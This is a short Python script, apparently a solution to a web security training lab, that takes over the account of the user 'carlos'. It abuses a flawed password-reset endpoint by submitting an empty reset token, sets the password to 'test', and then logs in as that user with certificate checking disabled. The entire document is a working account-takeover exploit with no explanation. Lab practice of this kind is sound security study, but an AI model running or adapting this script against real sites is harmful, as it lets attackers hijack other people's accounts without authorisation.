import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {"https": "https://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}

# change carlos' pw
def reset_password(s, url):
    print("[*] Changing Carlos' password...")
    reset_url = url + "/forgot-password?temp-forgot-password-token"
    reset_data = {"temp-forgot-password-token": "", "username": "carlos", "new-password-1": "test", "new-password-2": "test"}
    r = s.post(reset_url, data=reset_data, verify=False)   

# login as Carlos
def login(s, url):
    print("[*] Logging in as Carlos...")
    login_url = url + "/login"
    login_data = {"username": "carlos", "password": "test"}
    r = s.post(login_url, data=login_data, verify=False)
    if "Log out" in r.text:
        print("[+] Logged in as user Carlos")
    else:
        print("[-] Error logging in")

def main():
    if len(sys.argv) !=2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        sys.exit()

    s = requests.Session()
    url = sys.argv[1].strip()  
    reset_password(s,url)
    login(s, url)    

if __name__=="__main__":
    main()                 
    